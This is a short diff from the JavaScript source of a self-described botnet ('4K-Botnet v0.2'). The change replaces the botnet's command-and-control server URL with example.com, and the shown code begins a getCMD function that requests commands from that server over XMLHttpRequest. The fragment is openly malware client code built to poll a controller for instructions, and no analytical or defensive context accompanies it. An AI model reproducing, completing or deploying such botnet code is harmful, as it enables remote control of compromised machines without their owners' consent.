@@ -1,6 +1,6 @@
 //4K-Botnet v0.2 by Chowix40
 //I know it's crap but it works (Kinda)
-var SERVER_URL = 'http://4k-server/4K-Botnet/Botnet/'
+var SERVER_URL = 'http://example.com/Botnet/'
 
 function getCMD() {
 var oReqcmd = new XMLHttpRequest();    
